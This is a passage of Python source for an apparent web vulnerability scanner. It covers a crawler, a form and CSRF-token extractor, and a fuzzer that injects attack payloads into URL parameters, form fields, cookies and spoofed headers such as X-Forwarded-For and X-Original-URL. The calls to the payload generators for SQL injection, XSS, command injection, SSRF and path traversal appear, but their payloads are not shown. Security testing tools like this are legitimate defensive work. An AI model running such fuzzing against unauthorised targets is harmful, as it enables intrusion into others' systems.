                        self._add_to_queue(js_url, depth + 1, normalized)

                if self._form_extractor:
                    page_forms = self._form_extractor.extract_forms(response.body, normalized)
                    endpoint.forms = page_forms
                    with self._lock:
                        self._forms.extend(page_forms)

            with self._lock:
                self._endpoints.append(endpoint)

        with self._lock:
            self._running = False

        result.endpoints = list(self._endpoints)
        result.forms = list(self._forms)
        result.urls_visited = set(self._visited)
        result.max_depth_reached = max_depth_reached
        result.robots_disallowed = list(self._robots_disallowed)
        result.sitemap_urls = list(self._sitemap_urls)
        result.errors = list(self._errors)
        result.finished_at = time.time()
        result.total_time = result.finished_at - result.started_at

        logger.info("Crawl complete: %d URLs visited, %d endpoints, %d forms, %.2fs",
                     len(result.urls_visited), len(result.endpoints),
                     len(result.forms), result.total_time)
        return result

    def stop(self) -> None:
        """Stop an ongoing crawl."""
        with self._lock:
            self._running = False

    def _add_to_queue(self, url: str, depth: int, parent: str) -> None:
        """Add URL to crawl queue if not visited."""
        normalized = self._normalize_url(url)
        with self._lock:
            if normalized not in self._visited and len(self._visited) < self._max_urls:
                self._queue.append((normalized, depth, parent))

    def _normalize_url(self, url: str) -> str:
        """Normalize URL by removing fragments, trailing slashes, normalizing case."""
        parsed = urllib.parse.urlparse(url)
        scheme = parsed.scheme.lower()
        netloc = parsed.netloc.lower()
        path = parsed.path.rstrip("/") if parsed.path != "/" else "/"
        query = parsed.query
        if query:
            params = urllib.parse.parse_qsl(query, keep_blank_values=True)
            params.sort(key=lambda x: x[0])
            query = urllib.parse.urlencode(params)
        normalized = urllib.parse.urlunparse((scheme, netloc, path, "", query, ""))
        return normalized

    def _is_in_scope(self, url: str) -> bool:
        """Check if URL is within defined scope."""
        parsed_target = urllib.parse.urlparse(self._target_url)
        parsed_url = urllib.parse.urlparse(url)

        if parsed_url.netloc.lower() != parsed_target.netloc.lower():
            return False

        if self._scope_patterns:
            for pattern in self._scope_patterns:
                try:
                    if re.search(pattern, url):
                        return True
                except re.error as exc:
                    logger.warning("Invalid scope pattern '%s': %s", pattern, exc)
            return False

        for pattern in self._exclude_patterns:
            try:
                if re.search(pattern, url):
                    return False
            except re.error as exc:
                logger.warning("Invalid exclude pattern '%s': %s", pattern, exc)

        return True

    def _is_disallowed_by_robots(self, url: str) -> bool:
        """Check if URL is disallowed by robots.txt."""
        if not self._respect_robots or not self._robots_disallowed:
            return False
        parsed = urllib.parse.urlparse(url)
        path = parsed.path
        for disallowed in self._robots_disallowed:
            if path.startswith(disallowed):
                return True
        return False

    def _is_static_resource(self, url: str) -> bool:
        """Check if URL points to a static resource."""
        parsed = urllib.parse.urlparse(url)
        path_lower = parsed.path.lower()
        for ext in STATIC_EXTENSIONS:
            if path_lower.endswith(ext):
                return True
        return False

    def _extract_links(self, html_body: str, base_url: str) -> List[str]:
        """Extract links from HTML content via regex."""
        links: List[str] = []

        try:
            href_pattern = re.compile(
                r'''(?:href|src|action)\s*=\s*(?:["']([^"']*?)["']|([^\s>]+))''',
                re.IGNORECASE
            )
            for match in href_pattern.finditer(html_body):
                raw = match.group(1) or match.group(2) or ""
                resolved = self._resolve_url(raw, base_url)
                if resolved:
                    links.append(resolved)

            meta_pattern = re.compile(
                r'<meta[^>]+(?:content|http-equiv)[^>]*url\s*=\s*([^"\'>\s;]+)',
                re.IGNORECASE
            )
            for match in meta_pattern.finditer(html_body):
                resolved = self._resolve_url(match.group(1), base_url)
                if resolved:
                    links.append(resolved)
        except (re.error, TypeError) as exc:
            logger.warning("Failed to extract links from %s: %s", base_url, exc)

        return links

    def _extract_js_urls_from_html(self, html_body: str, base_url: str) -> List[str]:
        """Extract URLs found inside JavaScript blocks."""
        urls: List[str] = []

        js_url_patterns = [
            re.compile(r'''(?:fetch|axios\.get|axios\.post|window\.location|location\.href|\.open)\s*\(\s*["']([^"']+?)["']''', re.IGNORECASE),
            re.compile(r'''["'](/(?:api|v\d|rest|graphql|ajax|ws|endpoint)[^"']*?)["']''', re.IGNORECASE),
            re.compile(r'''["']((?:https?://)[^"']+?)["']''', re.IGNORECASE),
            re.compile(r'''(?:url|endpoint|path|route|href|uri)\s*[:=]\s*["']([^"']+?)["']''', re.IGNORECASE),
        ]

        for pattern in js_url_patterns:
            try:
                for match in pattern.finditer(html_body):
                    raw = match.group(1)
                    if raw and not raw.startswith("javascript:") and not raw.startswith("data:"):
                        resolved = self._resolve_url(raw, base_url)
                        if resolved:
                            urls.append(resolved)
            except (re.error, TypeError) as exc:
                logger.warning("JS URL extraction error from %s: %s", base_url, exc)

        return urls

    def _extract_url_params(self, url: str) -> List[Parameter]:
        """Extract query parameters from URL."""
        parsed = urllib.parse.urlparse(url)
        params_list: List[Parameter] = []
        if parsed.query:
            for name, value in urllib.parse.parse_qsl(parsed.query, keep_blank_values=True):
                params_list.append(Parameter(
                    name=name,
                    value=value,
                    injection_point=InjectionPoint.URL_PARAM,
                ))
        return params_list

    def _resolve_url(self, raw_url: str, base_url: str) -> str:
        """Resolve a potentially relative URL against a base URL."""
        raw_url = raw_url.strip()
        if not raw_url:
            return ""
        if raw_url.startswith(("#", "mailto:", "tel:", "javascript:", "data:")):
            return ""
        try:
            resolved = urllib.parse.urljoin(base_url, raw_url)
            parsed = urllib.parse.urlparse(resolved)
            if parsed.scheme in ("http", "https") and parsed.netloc:
                return resolved
        except Exception:
            pass
        return ""

    def _parse_robots_txt(self) -> None:
        """Parse robots.txt for disallowed paths."""
        parsed = urllib.parse.urlparse(self._target_url)
        robots_url = f"{parsed.scheme}://{parsed.netloc}/robots.txt"
        logger.debug("Fetching robots.txt from %s", robots_url)

        response = self._client.request("GET", robots_url)
        if response.error or response.status_code != 200:
            logger.debug("robots.txt not available for %s", robots_url)
            return

        current_agent_applies = False
        for line in response.body.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if line.lower().startswith("user-agent:"):
                agent = line.split(":", 1)[1].strip().lower()
                current_agent_applies = agent == "*" or "siren" in agent
            elif line.lower().startswith("disallow:") and current_agent_applies:
                path = line.split(":", 1)[1].strip()
                if path:
                    self._robots_disallowed.append(path)
            elif line.lower().startswith("sitemap:"):
                sitemap_url = line.split(":", 1)[1].strip()
                if "://" not in sitemap_url:
                    sitemap_url = ":" + sitemap_url
                    idx = line.lower().index("sitemap:")
                    sitemap_url = line[idx + 8:].strip()
                if sitemap_url.startswith("http"):
                    self._sitemap_urls.append(sitemap_url)

        logger.debug("robots.txt: %d disallowed paths, %d sitemaps",
                     len(self._robots_disallowed), len(self._sitemap_urls))

    def _parse_sitemap_xml(self) -> None:
        """Parse sitemap.xml for additional URLs."""
        if not self._sitemap_urls:
            parsed = urllib.parse.urlparse(self._target_url)
            default_sitemap = f"{parsed.scheme}://{parsed.netloc}/sitemap.xml"
            self._sitemap_urls.append(default_sitemap)

        discovered: List[str] = []
        for sitemap_url in list(self._sitemap_urls):
            response = self._client.request("GET", sitemap_url)
            if response.error or response.status_code != 200:
                continue

            loc_pattern = re.compile(r"<loc>\s*(.*?)\s*</loc>", re.IGNORECASE)
            for match in loc_pattern.finditer(response.body):
                url = match.group(1).strip()
                if url:
                    if url.endswith(".xml"):
                        discovered_inner = self._fetch_sub_sitemap(url)
                        discovered.extend(discovered_inner)
                    else:
                        discovered.append(url)

        self._sitemap_urls = discovered
        logger.debug("Sitemap: discovered %d URLs", len(discovered))

    def _fetch_sub_sitemap(self, url: str) -> List[str]:
        """Fetch and parse a sub-sitemap."""
        urls: List[str] = []
        response = self._client.request("GET", url)
        if response.error or response.status_code != 200:
            return urls
        loc_pattern = re.compile(r"<loc>\s*(.*?)\s*</loc>", re.IGNORECASE)
        for match in loc_pattern.finditer(response.body):
            found = match.group(1).strip()
            if found:
                urls.append(found)
        return urls

    def get_visited_urls(self) -> Set[str]:
        with self._lock:
            return set(self._visited)

    def get_endpoints(self) -> List[Endpoint]:
        with self._lock:
            return list(self._endpoints)

    def get_forms(self) -> List[FormData]:
        with self._lock:
            return list(self._forms)


# ════════════════════════════════════════════════════════════════════════════════
# FORM EXTRACTOR
# ════════════════════════════════════════════════════════════════════════════════

class FormExtractor:
    """
    Extracts HTML forms, input fields, hidden fields, and CSRF tokens
    from HTML content using regex-based parsing.

    Usage:
        extractor = FormExtractor()
        forms = extractor.extract_forms(html_content, "https://example.com/page")
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._csrf_token_names: FrozenSet[str] = CSRF_TOKEN_NAMES
        self._total_forms_extracted: int = 0
        self._total_fields_extracted: int = 0
        logger.info("FormExtractor initialized")

    def extract_forms(self, html_body: str, source_url: str) -> List[FormData]:
        """Extract all forms from HTML content."""
        forms: List[FormData] = []
        if not html_body:
            return forms

        try:
            form_pattern = re.compile(
                r"<form\b([^>]*)>(.*?)</form>",
                re.IGNORECASE | re.DOTALL
            )
            matches = form_pattern.findall(html_body)
        except (re.error, TypeError) as exc:
            logger.warning("Failed to parse forms from %s: %s", source_url, exc)
            return forms
        for idx, (attrs_str, form_body) in enumerate(matches):
            if idx >= MAX_FORMS_PER_PAGE:
                break

            form = FormData(source_url=source_url)

            action = self._get_attr(attrs_str, "action")
            if action:
                form.action = self._resolve_action(action, source_url)
            else:
                form.action = source_url

            method_str = self._get_attr(attrs_str, "method").upper()
            if method_str == "POST":
                form.method = HttpMethod.POST
            elif method_str == "PUT":
                form.method = HttpMethod.PUT
            elif method_str == "DELETE":
                form.method = HttpMethod.DELETE
            elif method_str == "PATCH":
                form.method = HttpMethod.PATCH
            else:
                form.method = HttpMethod.GET

            enctype_str = self._get_attr(attrs_str, "enctype").lower()
            if "multipart" in enctype_str:
                form.enctype = FormEncType.MULTIPART
            elif "text/plain" in enctype_str:
                form.enctype = FormEncType.TEXT_PLAIN
            else:
                form.enctype = FormEncType.URL_ENCODED

            form.form_id = self._get_attr(attrs_str, "id")
            form.form_name = self._get_attr(attrs_str, "name")

            fields = self._extract_fields(form_body, form.method)
            form.fields = fields

            csrf_info = self._detect_csrf_token(fields)
            if csrf_info:
                form.has_csrf_token = True
                form.csrf_token_name = csrf_info[0]
                form.csrf_token_value = csrf_info[1]

            forms.append(form)

        with self._lock:
            self._total_forms_extracted += len(forms)

        logger.debug("Extracted %d forms from %s", len(forms), source_url)
        return forms

    def _extract_fields(self, form_body: str, form_method: HttpMethod) -> List[Parameter]:
        """Extract input fields from form body."""
        fields: List[Parameter] = []
        injection_point = (
            InjectionPoint.POST_BODY if form_method == HttpMethod.POST
            else InjectionPoint.URL_PARAM
        )

        try:
            input_pattern = re.compile(
                r"<input\b([^>]*)/??>",
                re.IGNORECASE | re.DOTALL
            )
            for match in input_pattern.finditer(form_body):
                if len(fields) >= MAX_PARAMS_PER_FORM:
                    break
                attrs = match.group(1)
                param = self._parse_input_attrs(attrs, injection_point)
                if param.name:
                    fields.append(param)

            textarea_pattern = re.compile(
                r"<textarea\b([^>]*)>(.*?)</textarea>",
                re.IGNORECASE | re.DOTALL
            )
            for match in textarea_pattern.finditer(form_body):
                if len(fields) >= MAX_PARAMS_PER_FORM:
                    break
                attrs = match.group(1)
                default_value = match.group(2).strip()
                param = Parameter(
                    name=self._get_attr(attrs, "name"),
                    value=default_value,
                    injection_point=injection_point,
                )
                if param.name:
                    fields.append(param)

            select_pattern = re.compile(
                r"<select\b([^>]*)>(.*?)</select>",
                re.IGNORECASE | re.DOTALL
            )
            for match in select_pattern.finditer(form_body):
                if len(fields) >= MAX_PARAMS_PER_FORM:
                    break
                attrs = match.group(1)
                options_body = match.group(2)
                name = self._get_attr(attrs, "name")
                if not name:
                    continue

                options: List[str] = []
                opt_pattern = re.compile(
                    r'<option\b[^>]*value\s*=\s*["\']?([^"\'>\s]*)',
                    re.IGNORECASE
                )
                for opt_match in opt_pattern.finditer(options_body):
                    options.append(opt_match.group(1))

                param = Parameter(
                    name=name,
                    value=options[0] if options else "",
                    injection_point=injection_point,
                    options=options,
                )
                fields.append(param)
        except (re.error, TypeError) as exc:
            logger.warning("Failed to extract form fields: %s", exc)

        with self._lock:
            self._total_fields_extracted += len(fields)

        return fields

    def _parse_input_attrs(self, attrs_str: str, injection_point: InjectionPoint) -> Parameter:
        """Parse input element attributes into a Parameter."""
        name = self._get_attr(attrs_str, "name")
        value = self._get_attr(attrs_str, "value")
        input_type_str = self._get_attr(attrs_str, "type").lower() or "text"
        required = "required" in attrs_str.lower()

        is_hidden = input_type_str == "hidden"

        max_length = -1
        ml_str = self._get_attr(attrs_str, "maxlength")
        if ml_str.isdigit():
            max_length = int(ml_str)

        pattern = self._get_attr(attrs_str, "pattern")

        param = Parameter(
            name=name,
            value=value,
            injection_point=injection_point,
            is_required=required,
            is_hidden=is_hidden,
            max_length=max_length,
            pattern=pattern,
        )
        return param

    def _detect_csrf_token(self, fields: List[Parameter]) -> Optional[Tuple[str, str]]:
        """Detect CSRF token in form fields."""
        for f in fields:
            if f.is_hidden and f.name.lower() in self._csrf_token_names:
                return (f.name, f.value)
            name_lower = f.name.lower().replace("-", "").replace("_", "")
            for token_name in self._csrf_token_names:
                clean = token_name.replace("-", "").replace("_", "")
                if clean == name_lower:
                    return (f.name, f.value)
        return None

    def _get_attr(self, attrs_str: str, attr_name: str) -> str:
        """Extract attribute value from HTML attribute string."""
        pattern = re.compile(
            rf'''{attr_name}\s*=\s*(?:["']([^"']*?)["']|(\S+))''',
            re.IGNORECASE
        )
        match = pattern.search(attrs_str)
        if match:
            return match.group(1) if match.group(1) is not None else (match.group(2) or "")
        return ""

    def _resolve_action(self, action: str, source_url: str) -> str:
        """Resolve form action URL."""
        action = action.strip()
        if not action or action == "#":
            return source_url
        if action.startswith("http://") or action.startswith("https://"):
            return action
        return urllib.parse.urljoin(source_url, action)

    def extract_hidden_fields(self, html_body: str) -> List[Parameter]:
        """Extract all hidden input fields from HTML."""
        hidden: List[Parameter] = []
        pattern = re.compile(
            r'<input\b[^>]*type\s*=\s*["\']?hidden["\']?[^>]*/?>',
            re.IGNORECASE
        )
        for match in pattern.finditer(html_body):
            param = self._parse_input_attrs(match.group(0), InjectionPoint.POST_BODY)
            if param.name:
                hidden.append(param)
        return hidden

    def extract_csrf_token(self, html_body: str) -> Optional[Tuple[str, str]]:
        """Extract CSRF token from HTML page."""
        hidden = self.extract_hidden_fields(html_body)
        return self._detect_csrf_token(hidden)

    def get_stats(self) -> Dict[str, int]:
        with self._lock:
            return {
                "total_forms_extracted": self._total_forms_extracted,
                "total_fields_extracted": self._total_fields_extracted,
            }


# ════════════════════════════════════════════════════════════════════════════════
# PARAMETER FUZZER
# ════════════════════════════════════════════════════════════════════════════════

class ParameterFuzzer:
    """
    Detects parameter types and injects appropriate payloads at multiple
    injection points (URL params, POST body, headers, cookies).

    Supports multi-position fuzzing where multiple parameters can be
    fuzzed simultaneously or individually.

    Usage:
        fuzzer = ParameterFuzzer(http_client)
        fuzzer.set_payload_generator(generator)
        results = fuzzer.fuzz_endpoint(endpoint)
    """

    def __init__(self, http_client: Optional[_HttpClient] = None) -> None:
        self._lock = threading.RLock()
        self._client: _HttpClient = http_client or _HttpClient()
        self._payload_generator: Optional[DynamicPayloadGenerator] = None
        self._response_analyzer: Optional[ResponseAnalyzer] = None
        self._delay: float = DEFAULT_DELAY
        self._scan_mode: ScanMode = ScanMode.NORMAL
        self._fuzz_cookies: bool = False
        self._fuzz_headers: bool = False
        self._max_payloads_per_param: int = 50
        self._total_fuzz_attempts: int = 0
        self._total_anomalies: int = 0
        self._results: List[FuzzResult] = []
        logger.info("ParameterFuzzer initialized")

    def set_payload_generator(self, generator: DynamicPayloadGenerator) -> None:
        with self._lock:
            self._payload_generator = generator

    def set_response_analyzer(self, analyzer: ResponseAnalyzer) -> None:
        with self._lock:
            self._response_analyzer = analyzer

    def set_scan_mode(self, mode: ScanMode) -> None:
        with self._lock:
            self._scan_mode = mode
            if mode == ScanMode.PASSIVE:
                self._max_payloads_per_param = 5
            elif mode == ScanMode.LIGHT:
                self._max_payloads_per_param = 15
            elif mode == ScanMode.NORMAL:
                self._max_payloads_per_param = 50
            elif mode == ScanMode.AGGRESSIVE:
                self._max_payloads_per_param = 200
            elif mode == ScanMode.STEALTH:
                self._max_payloads_per_param = 10
                self._delay = 2.0

    def set_delay(self, delay: float) -> None:
        with self._lock:
            self._delay = delay

    def set_fuzz_cookies(self, enabled: bool) -> None:
        with self._lock:
            self._fuzz_cookies = enabled

    def set_fuzz_headers(self, enabled: bool) -> None:
        with self._lock:
            self._fuzz_headers = enabled

    def detect_param_type(self, param: Parameter) -> ParamType:
        """Detect the type of a parameter based on name and value."""
        name_lower = param.name.lower()
        value = param.value

        if re.match(r"^-?\d+(\.\d+)?$", value) if value else False:
            return ParamType.NUMERIC

        email_names = {"email", "mail", "e-mail", "user_email", "useremail"}
        if name_lower in email_names or (value and re.match(r"^[^@]+@[^@]+\.[^@]+$", value)):
            return ParamType.EMAIL

        url_names = {"url", "uri", "link", "redirect", "return", "next", "goto",
                     "returnurl", "redirect_uri", "callback", "continue", "dest",
                     "destination", "rurl", "return_to", "returnto"}
        if name_lower in url_names or (value and re.match(r"^https?://", value)):
            return ParamType.URL

        date_names = {"date", "start_date", "end_date", "birthday", "dob",
                      "created", "updated", "expires", "timestamp"}
        if name_lower in date_names or (value and re.match(
                r"^\d{4}[-/]\d{2}[-/]\d{2}", value)):
            return ParamType.DATE

        if value:
            try:
                json.loads(value)
                return ParamType.JSON_VALUE
            except (json.JSONDecodeError, ValueError):
                pass

        bool_names = {"active", "enabled", "disabled", "is_admin", "admin",
                      "debug", "verbose", "flag", "status", "visible", "public"}
        if name_lower in bool_names or (value and value.lower() in ("true", "false", "0", "1", "yes", "no")):
            return ParamType.BOOLEAN

        path_names = {"file", "path", "filename", "filepath", "dir", "directory",
                      "template", "include", "page", "document", "folder", "load"}
        if name_lower in path_names or (value and ("/" in value or "\\" in value)):
            return ParamType.FILE_PATH

        import base64 as _b64
        if value and len(value) > 8:
            try:
                decoded = _b64.b64decode(value, validate=True)
                if decoded and len(decoded) > 0:
                    return ParamType.BASE64
            except Exception:
                pass

        uuid_pattern = r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$"
        if value and re.match(uuid_pattern, value, re.IGNORECASE):
            return ParamType.UUID_VALUE

        if value and re.match(r"^-?\d+$", value):
            return ParamType.NUMERIC

        if value:
            return ParamType.STRING

        return ParamType.UNKNOWN

    def fuzz_endpoint(self, endpoint: Endpoint) -> List[FuzzResult]:
        """Fuzz all parameters of an endpoint."""
        results: List[FuzzResult] = []

        if not self._payload_generator:
            logger.warning("No payload generator set, skipping fuzz")
            return results

        baseline = self._get_baseline(endpoint)

        for param in endpoint.parameters:
            param.param_type = self.detect_param_type(param)
            param_results = self._fuzz_parameter(endpoint, param, baseline)
            results.extend(param_results)

        for form in endpoint.forms:
            for field_param in form.fields:
                if field_param.name.lower() in CSRF_TOKEN_NAMES:
                    continue
                field_param.param_type = self.detect_param_type(field_param)
                form_results = self._fuzz_form_field(endpoint, form, field_param, baseline)
                results.extend(form_results)

        if self._fuzz_cookies:
            cookie_results = self._fuzz_cookies_params(endpoint, baseline)
            results.extend(cookie_results)

        if self._fuzz_headers:
            header_results = self._fuzz_header_params(endpoint, baseline)
            results.extend(header_results)

        with self._lock:
            self._results.extend(results)
            self._total_fuzz_attempts += len(results)
            self._total_anomalies += sum(1 for r in results if r.anomaly_detected)

        logger.info("Fuzzed endpoint %s: %d attempts, %d anomalies",
                     endpoint.url, len(results),
                     sum(1 for r in results if r.anomaly_detected))
        return results

    def _get_baseline(self, endpoint: Endpoint) -> HttpResponse:
        """Get a baseline response for comparison."""
        responses: List[HttpResponse] = []
        for _ in range(BASELINE_SAMPLES):
            resp = self._client.request(endpoint.method.value, endpoint.url)
            responses.append(resp)
            if self._delay > 0:
                time.sleep(self._delay)

        if not responses:
            return HttpResponse()

        avg_time = sum(r.elapsed for r in responses) / len(responses)
        best = responses[0]
        best.elapsed = avg_time
        return best

    def _fuzz_parameter(
        self,
        endpoint: Endpoint,
        param: Parameter,
        baseline: HttpResponse,
    ) -> List[FuzzResult]:
        """Fuzz a single URL parameter."""
        results: List[FuzzResult] = []
        if not self._payload_generator:
            return results

        payloads = self._payload_generator.generate_payloads(param)
        payloads = payloads[:self._max_payloads_per_param]

        parsed = urllib.parse.urlparse(endpoint.url)
        base_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        for payload in payloads:
            fuzzed_params = dict(base_params)
            fuzzed_params[param.name] = [payload]
            new_query = urllib.parse.urlencode(fuzzed_params, doseq=True)
            fuzzed_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, ""
            ))

            if self._delay > 0:
                time.sleep(self._delay)

            response = self._client.request(endpoint.method.value, fuzzed_url)

            result = FuzzResult(
                parameter=param.name,
                payload=payload,
                injection_point=InjectionPoint.URL_PARAM,
                original_value=param.value,
                response=response,
                baseline_response=baseline,
            )

            if self._response_analyzer:
                analysis = self._response_analyzer.analyze(response, baseline, payload, param.name)
                if analysis:
                    result.anomaly_detected = True
                    result.anomaly_type = analysis.get("type", "")
                    result.anomaly_details = analysis.get("details", "")
                    result.vuln_type = analysis.get("vuln_type")
                    result.confidence = analysis.get("confidence", 0.0)

            results.append(result)

        return results

    def _fuzz_form_field(
        self,
        endpoint: Endpoint,
        form: FormData,
        target_field: Parameter,
        baseline: HttpResponse,
    ) -> List[FuzzResult]:
        """Fuzz a single form field."""
        results: List[FuzzResult] = []
        if not self._payload_generator:
            return results

        payloads = self._payload_generator.generate_payloads(target_field)
        payloads = payloads[:self._max_payloads_per_param]

        for payload in payloads:
            body_params: Dict[str, str] = {}
            for f in form.fields:
                if f.name == target_field.name:
                    body_params[f.name] = payload
                else:
                    body_params[f.name] = f.value

            body = urllib.parse.urlencode(body_params)

            if self._delay > 0:
                time.sleep(self._delay)

            response = self._client.request(
                form.method.value,
                form.action,
                body=body,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
            )

            result = FuzzResult(
                parameter=target_field.name,
                payload=payload,
                injection_point=InjectionPoint.POST_BODY,
                original_value=target_field.value,
                response=response,
                baseline_response=baseline,
            )

            if self._response_analyzer:
                analysis = self._response_analyzer.analyze(
                    response, baseline, payload, target_field.name
                )
                if analysis:
                    result.anomaly_detected = True
                    result.anomaly_type = analysis.get("type", "")
                    result.anomaly_details = analysis.get("details", "")
                    result.vuln_type = analysis.get("vuln_type")
                    result.confidence = analysis.get("confidence", 0.0)

            results.append(result)

        return results

    def _fuzz_cookies_params(
        self,
        endpoint: Endpoint,
        baseline: HttpResponse,
    ) -> List[FuzzResult]:
        """Fuzz cookie values."""
        results: List[FuzzResult] = []
        if not self._payload_generator:
            return results

        current_cookies = self._client.get_cookies()
        for cookie_name, cookie_value in current_cookies.items():
            param = Parameter(
                name=cookie_name,
                value=cookie_value,
                injection_point=InjectionPoint.COOKIE,
            )
            param.param_type = self.detect_param_type(param)
            payloads = self._payload_generator.generate_payloads(param)
            payloads = payloads[:self._max_payloads_per_param // 2]

            for payload in payloads:
                fuzzed_cookies = dict(current_cookies)
                fuzzed_cookies[cookie_name] = payload

                if self._delay > 0:
                    time.sleep(self._delay)

                response = self._client.request(
                    endpoint.method.value,
                    endpoint.url,
                    cookies=fuzzed_cookies,
                )

                result = FuzzResult(
                    parameter=cookie_name,
                    payload=payload,
                    injection_point=InjectionPoint.COOKIE,
                    original_value=cookie_value,
                    response=response,
                    baseline_response=baseline,
                )

                if self._response_analyzer:
                    analysis = self._response_analyzer.analyze(
                        response, baseline, payload, cookie_name
                    )
                    if analysis:
                        result.anomaly_detected = True
                        result.anomaly_type = analysis.get("type", "")
                        result.anomaly_details = analysis.get("details", "")
                        result.vuln_type = analysis.get("vuln_type")
                        result.confidence = analysis.get("confidence", 0.0)

                results.append(result)

        return results

    def _fuzz_header_params(
        self,
        endpoint: Endpoint,
        baseline: HttpResponse,
    ) -> List[FuzzResult]:
        """Fuzz injectable HTTP headers."""
        results: List[FuzzResult] = []
        if not self._payload_generator:
            return results

        injectable_headers = [
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Forwarded-Host", "localhost"),
            ("X-Original-URL", "/"),
            ("X-Rewrite-URL", "/"),
            ("X-Custom-IP-Authorization", "127.0.0.1"),
            ("Referer", "https://example.com"),
            ("Origin", "https://example.com"),
            ("X-Forwarded-Proto", "https"),
            ("X-Real-IP", "127.0.0.1"),
            ("True-Client-IP", "127.0.0.1"),
        ]

        for header_name, default_val in injectable_headers:
            param = Parameter(
                name=header_name,
                value=default_val,
                injection_point=InjectionPoint.HEADER,
            )
            param.param_type = ParamType.STRING
            payloads = self._payload_generator.generate_payloads(param)
            payloads = payloads[:self._max_payloads_per_param // 4]

            for payload in payloads:
                if self._delay > 0:
                    time.sleep(self._delay)

                response = self._client.request(
                    endpoint.method.value,
                    endpoint.url,
                    headers={header_name: payload},
                )

                result = FuzzResult(
                    parameter=header_name,
                    payload=payload,
                    injection_point=InjectionPoint.HEADER,
                    original_value=default_val,
                    response=response,
                    baseline_response=baseline,
                )

                if self._response_analyzer:
                    analysis = self._response_analyzer.analyze(
                        response, baseline, payload, header_name
                    )
                    if analysis:
                        result.anomaly_detected = True
                        result.anomaly_type = analysis.get("type", "")
                        result.anomaly_details = analysis.get("details", "")
                        result.vuln_type = analysis.get("vuln_type")
                        result.confidence = analysis.get("confidence", 0.0)

                results.append(result)

        return results

    def fuzz_multi_position(
        self,
        endpoint: Endpoint,
        positions: List[Tuple[Parameter, str]],
    ) -> List[FuzzResult]:
        """
        Fuzz multiple parameters simultaneously with given payloads.

        Each tuple in positions is (parameter, payload).
        """
        results: List[FuzzResult] = []

        parsed = urllib.parse.urlparse(endpoint.url)
        base_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        fuzzed_params = dict(base_params)
        body_params: Dict[str, str] = {}
        fuzzed_headers: Dict[str, str] = {}
        fuzzed_cookies: Dict[str, str] = {}

        for param, payload in positions:
            if param.injection_point == InjectionPoint.URL_PARAM:
                fuzzed_params[param.name] = [payload]
            elif param.injection_point == InjectionPoint.POST_BODY:
                body_params[param.name] = payload
            elif param.injection_point == InjectionPoint.HEADER:
                fuzzed_headers[param.name] = payload
            elif param.injection_point == InjectionPoint.COOKIE:
                fuzzed_cookies[param.name] = payload

        new_query = urllib.parse.urlencode(fuzzed_params, doseq=True)
        fuzzed_url = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, ""
        ))

        body = urllib.parse.urlencode(body_params) if body_params else None

        if self._delay > 0:
            time.sleep(self._delay)

        response = self._client.request(
            endpoint.method.value,
            fuzzed_url,
            body=body,
            headers=fuzzed_headers if fuzzed_headers else None,
            cookies=fuzzed_cookies if fuzzed_cookies else None,
        )

        baseline = self._get_baseline(endpoint)

        for param, payload in positions:
            result = FuzzResult(
                parameter=param.name,
                payload=payload,
                injection_point=param.injection_point,
                original_value=param.value,
                response=response,
                baseline_response=baseline,
            )

            if self._response_analyzer:
                analysis = self._response_analyzer.analyze(
                    response, baseline, payload, param.name
                )
                if analysis:
                    result.anomaly_detected = True
                    result.anomaly_type = analysis.get("type", "")
                    result.anomaly_details = analysis.get("details", "")
                    result.vuln_type = analysis.get("vuln_type")
                    result.confidence = analysis.get("confidence", 0.0)

            results.append(result)

        with self._lock:
            self._results.extend(results)

        return results

    def get_results(self) -> List[FuzzResult]:
        with self._lock:
            return list(self._results)

    def get_stats(self) -> Dict[str, int]:
        with self._lock:
            return {
                "total_fuzz_attempts": self._total_fuzz_attempts,
                "total_anomalies": self._total_anomalies,
            }


# ════════════════════════════════════════════════════════════════════════════════
# DYNAMIC PAYLOAD GENERATOR
# ════════════════════════════════════════════════════════════════════════════════

class DynamicPayloadGenerator:
    """
    Context-aware payload generation engine. Generates payloads
    based on parameter name, type, reflection context, and scan mode.

    Supports error-based, time-based, blind, and polymorphic payloads
    with encoding variants (URL, double-URL, HTML entity, Unicode).

    Usage:
        gen = DynamicPayloadGenerator()
        gen.set_scan_mode(ScanMode.AGGRESSIVE)
        payloads = gen.generate_payloads(parameter)
    """

    # Canary for reflection detection
    CANARY = "SIREN_CANARY_" + hashlib.md5(b"siren_dast").hexdigest()[:8]

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._scan_mode: ScanMode = ScanMode.NORMAL
        self._custom_payloads: Dict[VulnType, List[str]] = defaultdict(list)
        self._encoding_variants: bool = True
        self._total_generated: int = 0
        self._payload_cache: Dict[str, List[str]] = {}
        logger.info("DynamicPayloadGenerator initialized")

    def set_scan_mode(self, mode: ScanMode) -> None:
        with self._lock:
            self._scan_mode = mode

    def add_custom_payload(self, vuln_type: VulnType, payload: str) -> None:
        with self._lock:
            self._custom_payloads[vuln_type].append(payload)

    def set_encoding_variants(self, enabled: bool) -> None:
        with self._lock:
            self._encoding_variants = enabled

    def generate_payloads(self, param: Parameter) -> List[str]:
        """Generate context-aware payloads for a parameter."""
        cache_key = f"{param.name}:{param.param_type.name}:{self._scan_mode.name}"
        with self._lock:
            if cache_key in self._payload_cache:
                return list(self._payload_cache[cache_key])

        payloads: List[str] = []

        payloads.extend(self._generate_sqli_payloads(param))
        payloads.extend(self._generate_xss_payloads(param))
        payloads.extend(self._generate_ssti_payloads(param))
        payloads.extend(self._generate_command_injection_payloads(param))

        if param.param_type == ParamType.URL:
            payloads.extend(self._generate_ssrf_payloads(param))
            payloads.extend(self._generate_open_redirect_payloads(param))

        if param.param_type == ParamType.FILE_PATH:
            payloads.extend(self._generate_lfi_payloads(param))
            payloads.extend(self._generate_path_traversal_payloads(param))

        if param.param_type == ParamType.NUMERIC:
            payloads.extend(self._generate_idor_payloads(param))

        payloads.extend(self._generate_crlf_payloads(param))
